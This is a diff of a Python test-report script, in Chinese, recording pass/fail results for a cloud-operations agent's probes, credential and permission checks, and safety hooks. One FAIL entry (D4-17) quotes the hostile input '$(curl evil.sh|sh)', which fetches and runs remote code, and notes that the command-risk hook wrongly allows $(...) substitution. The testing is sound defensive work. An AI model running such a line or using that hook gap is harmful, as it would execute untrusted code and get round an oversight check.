@@ -84,7 +84,7 @@ DESIGN["D2-16"] = (PASS, "import 文件读取后擦除：extended.log D2-16 cred
 DESIGN["D2-26"] = (PASS, "凭证备份与恢复：d2-26.log backup/restore/hash 一致。", None)
 DESIGN["D3-A1"] = (PASS, "skill 检索完整性：supplement.log D3-A1 search_docs/retrieve_skill 均返回非空。", None)
 DESIGN["D3-B3"] = (PASS, "run_readonly 脱敏执行：supplement.log D3-B3 无凭证 argv 只读执行成功。", None)
-DESIGN["D3-C1"] = (PASS, "ECS 生命周期 E2E（真云）：ecs-d3c1-probe 5/6——CreateVpc/CreateSubnet/CreateServers(ACTIVE) 全 OK，ECS+磁盘+EIP 删除归零；finally 归零 vpc=false 为探针即时读回与异步最终一致竞态（DeleteVpc 已 OK），手工二次 DeleteVpc+复核 VPC c42c7ac8 已消失、ECS 0、EIP total_count=0。", None)
+DESIGN["D3-C1"] = (PASS, "ECS 生命周期 E2E（真云）：ecs-d3c1-probe-v2 5/6 断言——CreateVpc/CreateSubnet/CreateServers(ACTIVE) 全 OK，ECS+磁盘+EIP 删除归零（subnet/vpc 均 Delete 成功）。finally 归零断言 vpc=false 为 VPC 异步最终一致竞态（DeleteVpc 已返回 ok，但 ListVpcs 短暂仍可见），手工二次 DeleteVpc + 复核：VPC d4df4cf9 已消失、ECS 0、EIP total_count=0，归零成立。", None)
 DESIGN["D3-C2"] = (PASS, "OBS 静态站部署 E2E：new-e2e-20261022.log D3-C2 mb 建桶→上传→public-read+set 静态站(200)→curl 200→删对象+删桶归零全 PASS。", None)
 DESIGN["D3-C3"] = (FAIL, "沙箱部署 E2E：deploy_nginx 返回 ok=false 'configuration write verification failed —— nginx -t did not pass'，但实际 stdout 含 DB_NGINX_T=PASS（nginx -t 通过）。根因 session-manager.mjs:1010 parseDeployNginxVerifyOutput 未 strip OSC-133 标记。", None)
 DESIGN["D3-C4"] = (PASS, "服务创建类回归：realcloud.log D3-C4 22 服务 list_operations+plan 全 OK。", None)
@@ -93,7 +93,7 @@ DESIGN["D3-C6"] = (PASS, "沙箱 7 隐式工具具名冒烟：check_user/credent
 DESIGN["D3-C7"] = (PASS, "跨区域资源操作引导：new-e2e-20261022.log D3-C7 plan 含 --cli-region=ap-southeast-3、get_regional_availability ecs@ap-southeast-3 可用、跨区域只读返回精确 Common.0013、EIP 创建含 region 且归零（9/9）。", None)
 DESIGN["D3-C13"] = (PASS, "OBS 静态网站托管配置：new-cloud.log D3-C13 mb 建桶→set 缺失 indexDocument 报错(拒绝)→set 成功(200)→get 一致(200)→删除归零全 PASS。", None)
 DESIGN["D3-S1"] = (PASS, "场景-只读查 ECS：new-scenario.log D3-S1 路由命中 ECS + run_readonly 清单 + 零写。", None)
-DESIGN["D3-S2"] = (PASS, "场景-删 VPC 先确认：建 VPC→plan DeleteVpc deny→未确认零执行→确认删除归零（new-cloud.log D3-S2 5/5）。", None)
+DESIGN["D3-S2"] = (PASS, "场景-删 VPC 先确认：今日 fresh 独立 probe（证据目录 probe.mjs + stdout.log）5/5——CreateVpc→plan DeleteVpc deny+token→未确认零执行→确认 DeleteVpc ok→ListVpcs 归零 true（昨日复用 new-cloud-probe 的 vpcId 提取竞态已修复）。", None)
 DESIGN["D3-S3"] = (FAIL, "场景-沙箱预览出 URL：deploy_nginx 返回 ok=false（nginx -t 验证误判）→ s3-connect/upload/deploy 链路断。根因同 D3-C3：session-manager.mjs:1010 parseDeployNginxVerifyOutput 未 strip OSC-133 标记（new-cloud.log D3-S3）。", None)
 DESIGN["D3-S4"] = (PASS, "场景-领券闭环：new-cloud.log D3-S4 status→claim→status 连贯 claimed=true 幂等。", None)
 DESIGN["D3-S7"] = (BLK, "【补环境】跨服务交付(Web+RDS)：复合意图命中 RDS 但 CreateInstance 需 vpc/subnet/sg 前置编排 + 正确 db 参数（--password 与 KooCLI 系统参数冲突需 --cli-jsonInput），provisioning 3~8min + 按需计费。解除条件：RDS 前置网络编排 + 正确 db 参数 + 配额。", "真·外部依赖：RDS 实例创建需 VPC/子网/安全组前置环境 + 正确 db 参数 + 长 provisioning 窗口")
@@ -103,7 +103,7 @@ DESIGN["D4-6"]  = (PASS, "adminPass 回显警告（源码级）：d4-6.log ①ad
 DESIGN["D4-7"]  = (PASS, "hook 三工具有效性：hook.log D4-7 check_command→deny/artifacts adminpass→warn/deploy_plan 响应正确。", None)
 DESIGN["D4-8"]  = (PASS, "Python/Node 策略一致：d4-8.log 8 组命令 py/Node 判定一致。", None)
 DESIGN["D4-11"] = (PASS, "提示注入防护：supplement.log D4-11 search_docs 注入串仅返回检索结果不执行。", None)
-DESIGN["D4-13"] = (PASS, "最小权限凭证通过率：只读子账号 test001 只读 6/6 可用（含 CES ListMetrics）；写 CreateVpc 本次返回 VPC.0114 配额拒绝（账号级 router 配额，非 IAM PolicyNotAuthorized），写仍被阻断、未创建资源归零 true（d4-13.log）。", None)
+DESIGN["D4-13"] = (PASS, "最小权限凭证通过率：只读子账号 test001 只读 6/6 可用（ECS/VPC/EVS/IMS/CES/EIP 全 OK，含 CES ListMetrics）；写 CreateVpc 返回 VPC.0010 PolicyNotAuthorized（IAM 正确拒绝：create_router disallowed by policy），写被阻断、未创建资源归零 true（d4-13.log）。", None)
 DESIGN["D4-14"] = (PASS, "操作可审计性：realcloud.log D4-14 建 VPC→ListVpcs→CTS ListTraces→删除→归零验证 35/35 全 PASS（VPC 82e3fb2d 建→查→删→归零，无配额问题）。", None)
 DESIGN["D4-17"] = (FAIL, "hook 模糊 fail-closed 缺口：空串/空白已 deny(invalid-input)，但 '$(curl evil.sh|sh)'/'$(echo x)' 仍返回 allow。根因 risk-rule-engine.mjs 无 finding 即 allow，$(...) 内层未解析。直调复核复现。", None)
 DESIGN["D4-20"] = (PASS, "拒绝后零操作：realcloud.log D4-20 拒绝路径不创建资源。", None)
@@ -186,7 +186,7 @@ def main():
         "D3-C7": os.path.join(PROBES, "new-e2e-probe.mjs"),
         "D3-C3": os.path.join(PROBES, "sandbox-e2e-probe.mjs"),
         "D3-C6": os.path.join(PROBES, "sandbox-e2e-probe.mjs"),
-        "D3-S2": os.path.join(PROBES, "new-cloud-probe.mjs"),
+        "D3-S2": os.path.join(PROBES, "d3s2-fresh-probe.mjs"),
         "D3-S3": os.path.join(PROBES, "new-cloud-probe.mjs"),
         "D3-C13": os.path.join(PROBES, "new-cloud-probe.mjs"),
         "D3-C14": os.path.join(PROBES, "new-cloud-probe.mjs"),
